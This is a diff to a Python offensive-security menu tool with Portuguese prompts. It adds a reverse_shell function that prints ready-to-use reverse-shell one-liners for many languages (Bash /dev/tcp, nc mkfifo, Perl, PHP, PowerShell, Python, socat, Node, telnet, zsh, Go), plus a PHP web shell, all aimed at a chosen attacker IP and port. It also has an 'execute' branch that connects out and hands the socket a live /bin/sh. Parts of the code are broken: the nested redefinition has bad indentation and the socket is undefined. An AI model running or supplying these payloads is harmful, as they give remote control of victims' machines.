@@ -968,7 +968,197 @@ def nc(porta):
 
 #=======================================================================================
 def reverse_shell():
-    pass
+    def reverse_shell():
+    try:
+        print('''
+Você deseja Pesquisar ou Executar?
+
+\033[0;34m[1]\033[m Pesquisar  \033[0;34m[2]\033[m Executar \033[0;34m[0]\033[m Voltar
+    ''')
+        sit_rev=int(input('Escolha uma opção: '))
+        if(sit_rev == 1):
+            ip = input('Digite o IP do Commander: ')
+            porta = input('Digite a Porta: ')
+            print('''\033[1;35m
+ ____     ___ __ __    ___  ____    _____   ___       _____ __ __    ___  _      _     
+|    \   /  _]  |  |  /  _]|    \  / ___/  /  _]     / ___/|  |  |  /  _]| |    | |    
+|  D  ) /  [_|  |  | /  [_ |  D  )(   \_  /  [_     (   \_ |  |  | /  [_ | |    | |    
+|    / |    _]  |  ||    _]|    /  \__  ||    _]     \__  ||  _  ||    _]| |___ | |___ 
+|    \ |   [_|  :  ||   [_ |    \  /  \ ||   [_      /  \ ||  |  ||   [_ |     ||     |
+|  .  \|     |\   / |     ||  .  \ \    ||     |     \    ||  |  ||     ||     ||     |
+|__|\_||_____| \_/  |_____||__|\_|  \___||_____|      \___||__|__||_____||_____||_____|
+\033[m     								Sobre: \033[1;33mrevshells.com\033m
+ \033[0;34m[1]\033[m  Bash
+ \033[0;34m[2]\033[m  NC
+ \033[0;34m[3]\033[m  Rust
+ \033[0;34m[4]\033[m  PERL
+ \033[0;34m[5]\033[m  PHP
+ \033[0;34m[6]\033[m  PowerShell
+ \033[0;34m[7]\033[m  Python
+ \033[0;34m[8]\033[m  SoCat
+ \033[0;34m[9]\033[m  Node
+ \033[0;34m[10]\033[m JavaScript
+ \033[0;34m[11]\033[m TelNet
+ \033[0;34m[12]\033[m zsh
+ \033[0;34m[13]\033[m GoLang
+
+ \033[0;34m[0]\033[m  \033[2;32mInício\033[m
+''')
+            bash = 'sh -i >& /dev/tcp/{}/{} 0>&1'.format(ip,porta)
+            bash196 = '0<&196;exec 196<>/dev/tcp/{}/{}; sh <&196 >&196 2>&196'.format(ip,porta)
+            bash_read_line = 'exec 5<>/dev/tcp/{}/{};cat <&5 | while read line; do $line 2>&5 >&5; done'.format(ip,porta)
+            bash5 = 'sh -i 5<> /dev/tcp/{}/{} 0<&5 1>&5 2>&5'.format(ip,porta)
+            bash_udp = 'sh -i >& /dev/udp/{}/{} 0>&1'.format(ip,porta)
+            nc_mkfifo = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {} {} >/tmp/f'.format(ip,porta)
+            nc = 'nc {} {} -e sh'.format(ip,porta)
+            rust = 'rcat {} {} -r sh'.format(ip,porta)
+            perl = """perl -e 'use Socket;$i="SEUIP";$p=SUAPORTA;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'"""
+            perl_nosh = """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{}:{}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""".format(ip,porta)
+            php = """ <?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?> """
+            php_exec = """php -r '$sock=fsockopen("{}",{});exec("sh <&3 >&3 2>&3");'""".format(ip,porta)
+            php_shell = """php -r '$sock=fsockopen("{}",{});shell_exec("sh <&3 >&3 2>&3");'""".format(ip,porta)
+            power64 = """powershell -e client = New-Object System.Net.Sockets.TCPClient("192.168.0.192",4545);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
+            python_sh= """export RHOST="{}";export RPORT={};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'""".format(ip,porta)
+            python = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""".format(ip,porta)
+            socat = """socat TCP:{}:{} EXEC:sh""".format(ip,porta)
+            socat_tty = """socat TCP:{}:{} EXEC:'sh',pty,stderr,setsid,sigint,sane""".format(ip,porta)
+            node = """require('child_process').exec('nc -e sh {} {}')""".format(ip,porta)
+            javascript = """String command = "var host = 'SEUIP';" +
+                        "var port = SUAPORTA;" +
+                        "var cmd = 'sh';"+
+                        "var s = new java.net.Socket(host, port);" +
+                        "var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();"+
+                        "var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();"+
+                        "var po = p.getOutputStream(), so = s.getOutputStream();"+
+                        "print ('Connected');"+
+                        "while (!s.isClosed()) {"+
+                        "    while (pi.available() > 0)"+
+                        "        so.write(pi.read());"+
+                        "    while (pe.available() > 0)"+
+                        "        so.write(pe.read());"+
+                        "    while (si.available() > 0)"+
+                        "        po.write(si.read());"+
+                        "    so.flush();"+
+                        "    po.flush();"+
+                        "    java.lang.Thread.sleep(50);"+
+                        "    try {"+
+                        "        p.exitValue();"+
+                        "        break;"+
+                        "    }"+
+                        "    catch (e) {"+
+                        "    }"+
+                        "}"+
+                        "p.destroy();"+
+                        "s.close();";
+    String x = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\""+command+"\")";
+    ref.add(new StringRefAddr("x", x);"""
+            telnet='TF=$(mktemp -u);mkfifo $TF && telnet {} {} 0<$TF | sh 1>$TF'.format(ip,porta)
+            zsh = """zsh -c 'zmodload zsh/net/tcp && ztcp {} {} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""".format(ip,porta)
+            golang = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","SEUIP","SUAPORTA");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
+
+            revsit=int(input('Escolha uma opção: '))
+            if revsit == 1:
+                print('')
+                print('|BASH|')
+                print('-\033[0;31m',bash,'\033[m')
+                print('-\033[0;31m',bash196,'\033[m')
+                print('-\033[0;31m',bash_read_line,'\033[m')
+                print('-\033[0;31m',bash5,'\033[m')
+                print('-\033[0;31m',bash_udp,'\033[m')
+                print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 2:
+                print('')
+                print('-\033[0;31m',nc_mkfifo,'\033[m')
+                print('-\033[0;31m',nc,'\033[m');print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 3:
+                print('')
+                print('|RUST|')
+                print('-\033[0;31m',rust,'\033[m')
+                print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 4:
+                print('')
+                print('|PERL|')
+                print('-\033[0;31m',perl,'\033[m')
+                print('-\033[0;31m',perl_nosh,'\033[m')
+                print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 5:
+                print('');print('|PHP|')
+                print('-\033[0;31m',php,'\033[m')
+                print('-\033[0;31m',php_exec,'\033[m')
+                print('-\033[0;31m',php_shell,'\033[m')
+                print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 6:
+                print('');print('|POWERSHELL|');print('-\033[0;31m',power64,'\033[m');print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 7:
+                print('');print('|PYTHON|');print('-\033[0;31m',python,'\033[m');print('-\033[0;31m',python_sh,'\033[m');print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 8:
+                print('');print('|SOCAT|');print('-\033[0;31m',socat,'\033[m');print('-\033[0;31m',socat_tty,'\033[m');print('')
+                input(press)
+                reverse_shell()	
+            elif revsit == 9:
+                print('');print('|NODE|');print('-\033[0;31m',node,'\033[m');print('')
+                input(press)
+                reverse_shell()		
+            elif revsit == 10:
+                print('');print('|JAVASCRIPT|');print('-\033[0;31m',javascript,'\033[m');print('')
+                input(press)
+                reverse_shell()	
+            elif revsit == 11:
+                print('');print('|TELNET|');print('-\033[0;31m',telnet,'\033[m');print('')
+                input(press)
+                reverse_shell()	
+            elif revsit == 12:
+                print('');print('|ZSH|');print('-\033[0;31m',zsh,'\033[m');print('')
+                input(press)
+                reverse_shell()	
+            elif revsit == 13:
+                print('')
+                print('|GOLANG|')
+                print('-\033[0;31m',golang,'\033[m')
+                print('')
+                input(press)
+                reverse_shell()
+            elif revsit == 0:
+                input(press)
+                main()				
+            elif revsit > 13:
+                print('Digite uma opção válida!')
+                input(press)
+                reverse_shell()
+        elif(sit_rev == 2):
+            commander=input('Digite o IP: ')
+            porta=int(input('Digite a Porta: '))
+            try:
+                s.connect((commander,porta))
+                print('Conectado com Sucesso!')
+                comando = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
+                print(f"Sugestão de comando: {comando}")
+                os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+                p=os.system("/bin/sh -i")
+            except OSError:
+                print('\033[0;31mHost não alcançado\033[m')
+        elif(sit_rev == 0):
+            input(press)
+            main()
+    except ValueError as e:
+        print('Digite uma opção válida!')
+        input(press)
+        reverse_shell()
+
 #=======================================================================================
 def server_tcp():
     try:
